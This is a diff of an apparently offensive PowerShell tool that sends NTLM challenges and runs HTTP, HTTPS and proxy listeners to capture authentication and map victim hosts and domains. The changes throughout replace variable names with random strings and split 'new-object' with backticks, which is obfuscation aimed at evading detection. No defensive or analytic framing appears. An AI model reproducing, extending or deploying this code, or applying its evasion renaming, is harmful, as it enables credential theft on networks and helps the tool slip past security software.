+                $yesTdlnJczRCehbGsYrD = $yesTdlnJczRCehbGsYrD + $FozfUGUDzhlEtHZpkTIorvIgaIkWsKraYcH + 16
+                $lmNvgYqtIgsmhlujydqBkzcoOn = $zPlYIjTPqoNZzSUhtaTw[$yesTdlnJczRCehbGsYrD]
+                $vfvDllDKJdYKKWFSzYEB = 0
 
-                while($RaggedMemory -ne 0 -and $ColorReply -lt 10)
+                while($lmNvgYqtIgsmhlujydqBkzcoOn -ne 0 -and $vfvDllDKJdYKKWFSzYEB -lt 10)
                 {
-                    $SisterWriter = Get-UInt16DataLength ($RollGreat + 2) $MuscleRatty
+                    $JuvYtugDBjIXCTubYRmHeLeHDoqsQQMow = Get-UInt16DataLength ($yesTdlnJczRCehbGsYrD + 2) $zPlYIjTPqoNZzSUhtaTw
 
-                    switch($RaggedMemory) 
+                    switch($lmNvgYqtIgsmhlujydqBkzcoOn) 
                     {
 
                         2
                         {
-                            $WrongCub = Convert-DataToString ($RollGreat + 4) $SisterWriter $MuscleRatty
+                            $YtsMurNnkyMMDgBMZthgXL = Convert-DataToString ($yesTdlnJczRCehbGsYrD + 4) $JuvYtugDBjIXCTubYRmHeLeHDoqsQQMow $zPlYIjTPqoNZzSUhtaTw
                         }
 
                         3
                         {
-                            $SleepyMinute = Convert-DataToString ($RollGreat + 4) $SisterWriter $MuscleRatty
+                            $XOXAdgLMcJAKByDFMwFlzPAjKplrGREboOts = Convert-DataToString ($yesTdlnJczRCehbGsYrD + 4) $JuvYtugDBjIXCTubYRmHeLeHDoqsQQMow $zPlYIjTPqoNZzSUhtaTw
                         }
 
                         4
                         {
-                            $ArtMessy = Convert-DataToString ($RollGreat + 4) $SisterWriter $MuscleRatty
+                            $eiTLFcQJGuaYCJcgGdTiVDIXW = Convert-DataToString ($yesTdlnJczRCehbGsYrD + 4) $JuvYtugDBjIXCTubYRmHeLeHDoqsQQMow $zPlYIjTPqoNZzSUhtaTw
                         }
 
                     }
 
-                    $RollGreat = $RollGreat + $SisterWriter + 4
-                    $RaggedMemory = $MuscleRatty[$RollGreat]
-                    $ColorReply++
+                    $yesTdlnJczRCehbGsYrD = $yesTdlnJczRCehbGsYrD + $JuvYtugDBjIXCTubYRmHeLeHDoqsQQMow + 4
+                    $lmNvgYqtIgsmhlujydqBkzcoOn = $zPlYIjTPqoNZzSUhtaTw[$yesTdlnJczRCehbGsYrD]
+                    $vfvDllDKJdYKKWFSzYEB++
                 }
 
-                if($WrongCub -and $ArtMessy -and !$LightOval.domain_mapping_table.$WrongCub -and $WrongCub -ne $ArtMessy)
+                if($YtsMurNnkyMMDgBMZthgXL -and $eiTLFcQJGuaYCJcgGdTiVDIXW -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.$YtsMurNnkyMMDgBMZthgXL -and $YtsMurNnkyMMDgBMZthgXL -ne $eiTLFcQJGuaYCJcgGdTiVDIXW)
                 {
-                    $LightOval.domain_mapping_table.Add($WrongCub,$ArtMessy)
-                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $WrongCub to $ArtMessy") > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.Add($YtsMurNnkyMMDgBMZthgXL,$eiTLFcQJGuaYCJcgGdTiVDIXW)
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $YtsMurNnkyMMDgBMZthgXL to $eiTLFcQJGuaYCJcgGdTiVDIXW") > $null
                 }
 
-                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
+                for($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$vfvDllDKJdYKKWFSzYEB++)
                 {
 
-                    if($LightOval.enumerate[$ColorReply].IP -eq $DogSuffer -and !$LightOval.enumerate[$ColorReply].Hostname)
+                    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].IP -eq $bzuYBTesgpMTCghYjbbiqbRdMpLYlXcC -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname)
                     {
-                        $LightOval.enumerate[$ColorReply].Hostname = $SleepyMinute
-                        $LightOval.enumerate[$ColorReply]."DNS Domain" = $ArtMessy
-                        $LightOval.enumerate[$ColorReply]."netBIOS Domain" = $WrongCub
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname = $XOXAdgLMcJAKByDFMwFlzPAjKplrGREboOts
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB]."DNS Domain" = $eiTLFcQJGuaYCJcgGdTiVDIXW
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB]."netBIOS Domain" = $YtsMurNnkyMMDgBMZthgXL
                         break
                     }
 
@@ -3180,396 +3180,396 @@ $SuckFaded =
 
         }
 
-        return $EggsExist
+        return $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE
     }
 
 }
 
 # Microsoft".
-$SwimChief =
+$uVNwcSuPpObwGkXaIHGnPjejKgykjinwRX =
 {
-    param ($HeavySmall,$HeapDetect,$KindLick,$MilkyCelery,$LearnHelp,$OrangeDog,$SkirtStone,
-    $SuperbBlood,$SwingHorses,$RightSnail,$LunchCheat,$BadgeKind,$StewLean,$YummyShame,$YawnOdd,
-    $HugeDead,$SmashDolls,$MournMean,$SilkySmelly,$JumpyWrench,$ExpandNest,$SufferRefuse,$LoadTrade,
-    $RobustFail,$ReasonTrust)
+    param ($xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU,$fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn,$JoXWcoXEYHNGuWREHpaUFbcXY,$MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho,$HmzaQTfoETMMBLLoFthmsnPeudAqyQhk,$jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC,$SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP,
+    $KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY,$GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS,$JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA,$LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb,$mxyeWmucysuQaCQWfngETzsqqbNiqa,$lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl,$MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR,$obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE,
+    $TlvcCDlGUgNUeGiPhbVgt,$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS,$NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu,$NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV,$QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB,$eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR,$ZCWCfsgrcLUlJogmhFPdzZOB,$QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM,
+    $LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc,$aWWNkGgRqzQWHhdZkUzqbTdql)
 
     function Get-NTLMChallengeBase64
     {
-        param ([String]$HeavySmall,[Bool]$BlowFasten,[String]$WearyHead,[Int]$PuffyWinter)
+        param ([String]$xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU,[Bool]$EnLzJPYKXYPWbhZGLyGXTtfOBhACcxQkNJgUqVh,[String]$RXZoYGXBjEiaNExaBXvQcNJsdAVPtTwtppHy,[Int]$BdRAWtRjFXzuNmeMoCKOGTdWbOYJKLtk)
 
-        $SmellyWish = Get-Date
-        $SmellyWish = $SmellyWish.ToFileTime()
-        $SmellyWish = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($SmellyWish))
-        $SmellyWish = $SmellyWish.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+        $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc = Get-Date
+        $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc = $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc.ToFileTime()
+        $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc))
+        $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc = $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
 
-        if($HeavySmall)
+        if($xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU)
         {
-            $ObeseSteam = $HeavySmall
-            $FurrySpooky = $ObeseSteam.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
-            $FurrySpooky = $FurrySpooky.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $rvdCSGhvNvLjQcZcZRqyTMGbLWbFLaUVtU = $xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU
+            $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra = $rvdCSGhvNvLjQcZcZRqyTMGbLWbFLaUVtU.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
+            $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra = $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         }
         else
         {
-            $FurrySpooky = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist 1 -WallWish 255)})
-            $ObeseSteam = $FurrySpooky -replace ' ', ''
-            $FurrySpooky = $FurrySpooky.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-rQvIhbCYcgJnjexbvfzYl -RyfnekGrAXltRYKOcZlmehLbXfMrcRXMOsdYDZFzv 1 -MWmmsgTGcAfLneCdvoUydakhVQxIVvPpmvWLoT 255)})
+            $rvdCSGhvNvLjQcZcZRqyTMGbLWbFLaUVtU = $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra -replace ' ', ''
+            $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra = $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         }
 
-        if($BlowFasten)
+        if($EnLzJPYKXYPWbhZGLyGXTtfOBhACcxQkNJgUqVh)
         {
-            $ToyEarth = 0x05,0x82,0x89,0x0a
+            $qCNhZqHlDGIThwIJQSCguiZeLUpDBwNLCrpVqCZMQD = 0x05,0x82,0x89,0x0a
         }
         else
         {
-            $ToyEarth = 0x05,0x82,0x81,0x0a
+            $qCNhZqHlDGIThwIJQSCguiZeLUpDBwNLCrpVqCZMQD = 0x05,0x82,0x81,0x0a
         }
 
-        if(!$LightOval.HTTP_session_table.ContainsKey("$WearyHead`:$PuffyWinter"))
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTP_session_table.ContainsKey("$RXZoYGXBjEiaNExaBXvQcNJsdAVPtTwtppHy`:$BdRAWtRjFXzuNmeMoCKOGTdWbOYJKLtk"))
         {
-            $LightOval.HTTP_session_table.Add("$WearyHead`:$PuffyWinter",$ObeseSteam)
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTP_session_table.Add("$RXZoYGXBjEiaNExaBXvQcNJsdAVPtTwtppHy`:$BdRAWtRjFXzuNmeMoCKOGTdWbOYJKLtk",$rvdCSGhvNvLjQcZcZRqyTMGbLWbFLaUVtU)
         }
         else
         {
-            $LightOval.HTTP_session_table["$WearyHead`:$PuffyWinter"] = $ObeseSteam
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTP_session_table["$RXZoYGXBjEiaNExaBXvQcNJsdAVPtTwtppHy`:$BdRAWtRjFXzuNmeMoCKOGTdWbOYJKLtk"] = $rvdCSGhvNvLjQcZcZRqyTMGbLWbFLaUVtU
         }
 
-        $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] $FlagBolt($LunchCheat) NTLM challenge $ObeseSteam sent to $SpringBorder`:$ForkNeed") > $null
-        $HillHappen = [System.Text.Encoding]::Unicode.GetBytes($LightOval.computer_name)
-        $NightStitch = [System.Text.Encoding]::Unicode.GetBytes($LightOval.netBIOS_domain)
-        $WhineLame = [System.Text.Encoding]::Unicode.GetBytes($LightOval.DNS_domain)
-        $IslandGrip = [System.Text.Encoding]::Unicode.GetBytes($LightOval.DNS_computer_name)
-        $PlugAttach = [System.BitConverter]::GetBytes($HillHappen.Length)[0,1]
-        $SnailWink = [System.BitConverter]::GetBytes($NightStitch.Length)[0,1]
-        $AblazeBetter = [System.BitConverter]::GetBytes($WhineLame.Length)[0,1]
-        $StoneBest = [System.BitConverter]::GetBytes($IslandGrip.Length)[0,1]
-        $UncleFlag = [System.BitConverter]::GetBytes($HillHappen.Length + $NightStitch.Length + $WhineLame.Length + $WhineLame.Length + $IslandGrip.Length + 36)[0,1]
-        $ManageErect = [System.BitConverter]::GetBytes($NightStitch.Length + 56)
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] $HVlqawqqFHiCxsbfiRKPAt($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb) NTLM challenge $rvdCSGhvNvLjQcZcZRqyTMGbLWbFLaUVtU sent to $tYqNqMYlIzEmrvCHkHYdIInEeoaqWt`:$WuvalrywzyDlyeBEMutCBYyjF") > $null
+        $yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV = [System.Text.Encoding]::Unicode.GetBytes($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.computer_name)
+        $LxMOHWmNijJmcXOwUXdTNuGiEnYDhBhtIsWtuOtRUaCwD = [System.Text.Encoding]::Unicode.GetBytes($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.netBIOS_domain)
+        $dhhAgDJFttIdxHBIHioEErQKp = [System.Text.Encoding]::Unicode.GetBytes($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_domain)
+        $CcikzZFstqkSaniGIQmxSmHWaLuWTFnqg = [System.Text.Encoding]::Unicode.GetBytes($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_computer_name)
+        $kShuPDicipbrdUbQtYbxtzztSoRl = [System.BitConverter]::GetBytes($yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV.Length)[0,1]
+        $hTsDtSpVzdeFJdOkVTJQmNkfaMYpIvaWpkSJ = [System.BitConverter]::GetBytes($LxMOHWmNijJmcXOwUXdTNuGiEnYDhBhtIsWtuOtRUaCwD.Length)[0,1]
+        $ofVkldQMpmgLjuqPSryoQzYnidcZnt = [System.BitConverter]::GetBytes($dhhAgDJFttIdxHBIHioEErQKp.Length)[0,1]
+        $ILbnUYthHLBBPKhplVbsTWrkQKicVUsdBpCb = [System.BitConverter]::GetBytes($CcikzZFstqkSaniGIQmxSmHWaLuWTFnqg.Length)[0,1]
+        $BbTXOFaWebdHQraBOnudIklYxYenvdTYQTZhoN = [System.BitConverter]::GetBytes($yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV.Length + $LxMOHWmNijJmcXOwUXdTNuGiEnYDhBhtIsWtuOtRUaCwD.Length + $dhhAgDJFttIdxHBIHioEErQKp.Length + $dhhAgDJFttIdxHBIHioEErQKp.Length + $CcikzZFstqkSaniGIQmxSmHWaLuWTFnqg.Length + 36)[0,1]
+        $sukCAOhnbREWFEVOOZEPezGdqhDD = [System.BitConverter]::GetBytes($LxMOHWmNijJmcXOwUXdTNuGiEnYDhBhtIsWtuOtRUaCwD.Length + 56)
 
-        $UsefulFrogs = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
-                            $SnailWink +
-                            $SnailWink +
+        $hGPdNCSayATARFoEppgOkVTVWDPwZsJCyWv = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
+                            $hTsDtSpVzdeFJdOkVTJQmNkfaMYpIvaWpkSJ +
+                            $hTsDtSpVzdeFJdOkVTJQmNkfaMYpIvaWpkSJ +
                             0x38,0x00,0x00,0x00 +
-                            $ToyEarth +
-                            $FurrySpooky +
+                            $qCNhZqHlDGIThwIJQSCguiZeLUpDBwNLCrpVqCZMQD +
+                            $ZmqgMJZaJATAZpwQIgRGksYuSQdGSCUXoyAisJvfHRra +
                             0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
-                            $UncleFlag +
-                            $UncleFlag + 
-                            $ManageErect +
+                            $BbTXOFaWebdHQraBOnudIklYxYenvdTYQTZhoN +
+                            $BbTXOFaWebdHQraBOnudIklYxYenvdTYQTZhoN + 
+                            $sukCAOhnbREWFEVOOZEPezGdqhDD +
                             0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
-                            $NightStitch +
+                            $LxMOHWmNijJmcXOwUXdTNuGiEnYDhBhtIsWtuOtRUaCwD +
                             0x02,0x00 +
-                            $SnailWink +
-                            $NightStitch +
+                            $hTsDtSpVzdeFJdOkVTJQmNkfaMYpIvaWpkSJ +
+                            $LxMOHWmNijJmcXOwUXdTNuGiEnYDhBhtIsWtuOtRUaCwD +
                             0x01,0x00 +
-                            $PlugAttach +
-                            $HillHappen +
+                            $kShuPDicipbrdUbQtYbxtzztSoRl +
+                            $yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV +
                             0x04,0x00 +
-                            $AblazeBetter +
-                            $WhineLame +
+                            $ofVkldQMpmgLjuqPSryoQzYnidcZnt +
+                            $dhhAgDJFttIdxHBIHioEErQKp +
                             0x03,0x00 +
-                            $StoneBest +
-                            $IslandGrip +
+                            $ILbnUYthHLBBPKhplVbsTWrkQKicVUsdBpCb +
+                            $CcikzZFstqkSaniGIQmxSmHWaLuWTFnqg +
                             0x05,0x00 +
-                            $AblazeBetter +
-                            $WhineLame +
+                            $ofVkldQMpmgLjuqPSryoQzYnidcZnt +
+                            $dhhAgDJFttIdxHBIHioEErQKp +
                             0x07,0x00,0x08,0x00 +
-                            $SmellyWish +
+                            $VhupKAfWEQmvHxpuRHUuAXdXeSwgfFISUKIDGqTmsPc +
                             0x00,0x00,0x00,0x00,0x0a,0x0a
 
-        $ExpectChop = [System.Convert]::ToBase64String($UsefulFrogs)
-        $WindBone = "NTLM " + $ExpectChop
+        $mBgerQfbQzzONjrtaqxGiSIOrDExsOCzNvkKfSM = [System.Convert]::ToBase64String($hGPdNCSayATARFoEppgOkVTVWDPwZsJCyWv)
+        $HYnEGzASViuUJzNoQskddNggVbRoI = "NTLM " + $mBgerQfbQzzONjrtaqxGiSIOrDExsOCzNvkKfSM
         
-        return $WindBone
+        return $HYnEGzASViuUJzNoQskddNggVbRoI
     }
 
-    if($HugeDead)
+    if($TlvcCDlGUgNUeGiPhbVgt)
     {
-        $FlagBolt = "HTTPS"
+        $HVlqawqqFHiCxsbfiRKPAt = "HTTPS"
     }
-    elseif($SufferRefuse)
+    elseif($ZCWCfsgrcLUlJogmhFPdzZOB)
     {
-        $FlagBolt = "Proxy"
+        $HVlqawqqFHiCxsbfiRKPAt = "Proxy"
     }
     else
     {
-        $FlagBolt = "HTTP"
+        $HVlqawqqFHiCxsbfiRKPAt = "HTTP"
     }
 
-    if($RightSnail -ne '0.0.0.0')
+    if($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA -ne '0.0.0.0')
     {
-        $RightSnail = [System.Net.IPAddress]::Parse($RightSnail)
-        $SailWinter = ne`w-`obje`ct System.Net.IPEndPoint($RightSnail,$LunchCheat)
+        $JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA = [System.Net.IPAddress]::Parse($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA)
+        $ISphjIRvmtiJaVkanuxhAEJFvDWptkX = ne`w`-`ob`je`ct System.Net.IPEndPoint($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA,$LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb)
     }
     else
     {
-        $SailWinter = ne`w-`obje`ct System.Net.IPEndPoint([System.Net.IPAddress]::Any,$LunchCheat)
+        $ISphjIRvmtiJaVkanuxhAEJFvDWptkX = ne`w`-`ob`je`ct System.Net.IPEndPoint([System.Net.IPAddress]::Any,$LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb)
     }
 
-    $StingyMellow = $true
-    $DropLamp = ne`w-`obje`ct System.Net.Sockets.TcpListener $SailWinter
+    $ksPMpmpafyuSzkpbtuiABCYbAzqgrlvB = $true
+    $QGILpbVZZGqLibvSoTsqThCOXZNYzJ = ne`w`-`ob`je`ct System.Net.Sockets.TcpListener $ISphjIRvmtiJaVkanuxhAEJFvDWptkX
    
-    if($SufferRefuse)
+    if($ZCWCfsgrcLUlJogmhFPdzZOB)
     {
-        $OfficeLate = ne`w-`obje`ct System.Net.Sockets.LingerOption($true,0)
-        $DropLamp.Server.LingerState = $OfficeLate
+        $sVZzyhnFKOnzrDmlTJFAVFvEuNbDPkEXckwDWPUQVmTFb = ne`w`-`ob`je`ct System.Net.Sockets.LingerOption($true,0)
+        $QGILpbVZZGqLibvSoTsqThCOXZNYzJ.Server.LingerState = $sVZzyhnFKOnzrDmlTJFAVFvEuNbDPkEXckwDWPUQVmTFb
     }
     
     try
     {
-        $DropLamp.Start()
+        $QGILpbVZZGqLibvSoTsqThCOXZNYzJ.Start()
     }
     catch
     {
-        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $FlagBolt listener") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HVlqawqqFHiCxsbfiRKPAt listener") > $null
         $error_message = $_.Exception.Message
         $error_message = $error_message -replace "`n",""
-        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-        $StingyMellow = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $ksPMpmpafyuSzkpbtuiABCYbAzqgrlvB = $false
     }
 
-    if($HeapDetect -eq 'Y')
+    if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y')
     {
 
-        if($LearnHelp)
+        if($HmzaQTfoETMMBLLoFthmsnPeudAqyQhk)
         {
-            $YummyCrowd = (&{for ($ColorReply = 0;$ColorReply -lt $LearnHelp.Length;$ColorReply += 2){$LearnHelp.SubString($ColorReply,2)}}) -join "-"
-            $YummyCrowd = $YummyCrowd.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq = (&{for ($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $HmzaQTfoETMMBLLoFthmsnPeudAqyQhk.Length;$vfvDllDKJdYKKWFSzYEB += 2){$HmzaQTfoETMMBLLoFthmsnPeudAqyQhk.SubString($vfvDllDKJdYKKWFSzYEB,2)}}) -join "-"
+            $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq = $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         }
-        elseif($MilkyCelery)
+        elseif($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho)
         {
-            $YummyCrowd = Get-KerberosAES256BaseKey ($MilkyCelery.UserName).Trim("\") $MilkyCelery.Password
+            $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq = Get-KerberosAES256BaseKey ($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho.UserName).Trim("\") $MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho.Password
         }
 
     }
     
-    :HTTP_listener_loop while($LightOval.running -and $StingyMellow)
+    :HTTP_listener_loop while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $ksPMpmpafyuSzkpbtuiABCYbAzqgrlvB)
     {
-        $VulgarBoard = $null
-        $RemoveClass = ne`w-`obje`ct System.Byte[] 8192
-        $LipSmall = $true
-        $SturdyPinch = [System.Text.Encoding]::UTF8.GetBytes("Content-EarBucket: text/html")
-        $MonthRare = $null
-        $CoatAttend = $null
-        $JadedWound = $null
-        $TankChange = ''
-        $YearLick = ''
-        $PartPlucky = $null
-        $LovelyMother = $null
-        $StewGun = $null
-        $WindBone = "NTLM"
+        $DewgFMbDmWRIFfvhuczeVlvJdbUx = $null
+        $dvRxTlPCfpXtZaRYXOQZjknNRCZGJeL = ne`w`-`ob`je`ct System.Byte[] 8192
+        $uYDwAMTYtBFOnonLzkvudmxMlvj = $true
+        $HtNVJATiHbEfXTHEWmPbh = [System.Text.Encoding]::UTF8.GetBytes("Content-NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa: text/html")
+        $MpgtsHdqCNZyDGvEjyzaQSRzRAzhibxeZdRHZkzmwcMk = $null
+        $MPzYiQhaPJyyjamwcmaRjzP = $null
+        $CXSXdNNjFyAsifHnnAqorIFhlI = $null
+        $eEhgsNlsHUqPfVwNBRythnTcVzbWdimOVL = ''
+        $zHYYbzselKAvdZkoUeEgMYMAypwRrIvgsyZFBcSndD = ''
+        $RccpaskStAKspwngsFTkmEZLUtqlhaHyRv = $null
+        $gHKQMITNsnGlDwlGjzuxfFxqVihtRtQxNMvpLEgFaKxF = $null
+        $RAeAsyRlMmNDrLzlWwuSnkKcuSpPKfi = $null
+        $HYnEGzASViuUJzNoQskddNggVbRoI = "NTLM"
 
-        if(!$SnatchStamp.Connected -and $LightOval.running)
+        if(!$oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Connected -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
         {
-            $DesireUnused = $false
-            $PanMale = $DropLamp.BeginAcceptTcpClient($null,$null)
+            $ZrMIvEFYTLFTbpUkrZSDZjzNxoreyslKac = $false
+            $CaBhwmDMzrtcCiJQNiWSGWSZXbE = $QGILpbVZZGqLibvSoTsqThCOXZNYzJ.BeginAcceptTcpClient($null,$null)
 
             do
             {
 
-                if(!$LightOval.running)
+                if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
                 {
                     break HTTP_listener_loop
                 }
                 
                 Start-Sleep -m 10
             }
-            until($PanMale.IsCompleted)
+            until($CaBhwmDMzrtcCiJQNiWSGWSZXbE.IsCompleted)
 
-            $SnatchStamp = $DropLamp.EndAcceptTcpClient($PanMale)
-            $QuackTickle = $SnatchStamp.Client.Handle
+            $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde = $QGILpbVZZGqLibvSoTsqThCOXZNYzJ.EndAcceptTcpClient($CaBhwmDMzrtcCiJQNiWSGWSZXbE)
+            $szPvEgzDwvzLSORtknunBQhQWPRkalfptseoZAmxTtHaT = $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.Client.Handle
             
-            if($HugeDead)
+            if($TlvcCDlGUgNUeGiPhbVgt)
             {
-                $VastRainy = $SnatchStamp.GetStream()
-                $GrateSpicy = ne`w-`obje`ct System.Net.Security.SslStream($VastRainy,$false)
-                $MilkyCanvas = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $LightOval.certificate_CN})
-                $GrateSpicy.AuthenticateAsServer($MilkyCanvas,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
+                $kjtZeCuHNQxvWYqhKLTGjCHhKnW = $oEDthgkOuxICsdYQvYdGTkYvIMBsDdxIveOAttIpTde.GetStream()
+                $gtWJOTknRyHoQUPpqdcgydUMysQll = ne`w`-`ob`je`ct System.Net.Security.SslStream($kjtZeCuHNQxvWYqhKLTGjCHhKnW,$false)
+                $BoBReZfkJaXxbGPuKOYhIeMtLuzQmigSbFnUQJaWqnAZ = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_CN})
